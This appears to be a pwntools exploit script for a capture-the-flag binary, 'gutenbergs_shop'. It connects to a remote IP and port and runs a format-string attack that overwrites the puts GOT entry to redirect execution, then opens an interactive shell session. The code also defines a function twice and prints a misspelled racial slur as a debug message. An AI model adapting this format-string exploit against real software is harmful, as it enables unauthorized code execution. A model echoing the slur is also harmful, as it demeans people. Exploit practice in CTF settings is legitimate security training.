from pwn import *


elf = context.binary = ELF('./gutenbergs_shop')

def main(offset = 0):
    
    #c = process("./gutenbergs_shop")
    c = remote('52.8.15.62', 8005)
    def send_payload(payload):
        log.info("payload = %s" % repr(payload))
        c.sendline(payload)
        reply = c.recv()
        log.info("reply = %s" % repr(reply))
        if not b"Ok" in reply:
            print("niga")
        return reply
    
    def send_payload(payload):
        c.sendline(payload)
        reply = c.recv()

        if not b"Ok" in reply:
            print("niga")
        return reply

    c.recv()
    #print()
    
    input()
    n_leaks = 16
    #elf.sym[""]
    #c.sendline(("%x" * (8) + "AAAAA" +  "%s" + "\xb9\x07\x40\x00\x00\x00\x00\x00" + "AAAA" + "12345678" * 8).encode())
    #c.sendline(("%016lx " * (32) + "AAAA" + "12345678" * 8).encode())
    # print(res)
    # print("data:")
    # data = c.recvline()
    # print(data)
    # res = []
    # word_size = 4 * 2
    # for i in range(0, n_leaks * word_size, word_size):
    #     res.append(bytes.fromhex(data[i:i+word_size].decode()))
    #print({elf.got["puts"], elf.sym["flag"]})
    #print(offset)
    #payload = fmtstr_payload(offset, {int(elf.got["puts"]), int(elf.sym["flag"])}, write_size='int')
    format_string = FmtStr(execute_fmt=send_payload, offset=offset)
    #format_string.write(0x4007b8, 0xe9860640) # write 0x1337babe at 0x0
    format_string.write(elf.got["puts"], 0x4006a4) # write 0x1337babe at 0x0
    
    #format_string.write(elf.got["puts"], elf.sym["flag"])
    print(hex(elf.got["puts"]))
    print(hex(elf.sym["flag"]))
    #TODO: write ip
    #format_string.write(0x4007b8, 0x1440) # write 0x1337babe at 0x0
    #format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
    #input()
    try:
        format_string.execute_writes()
        #a = c.poll(True)
        #if a < 0:
        #    return -1
        #c.sendline(payload)
    except Exception as e:
        print(e)
        return -1
    #print(f"waow {offset}")
    #input()
    #print(c.leak(0x004007b8, 4))
    #print(c.recv())
    
    # if(c.poll() == 1):
    #     print(f"{offset} yes")
    
    # print(c.recvline())

    #flag 40068B
    #set first arg
    # c.sendline(("A" * 1024).encode())
    
    # print(c.recv()) %s %s %s %s\
    c.interactive()
    return offset


# for i in range(100):
#     res = main(i)
#     if res == -1:
#         continue
#     print(f"{i} is yes")

r = main(6)
print(r)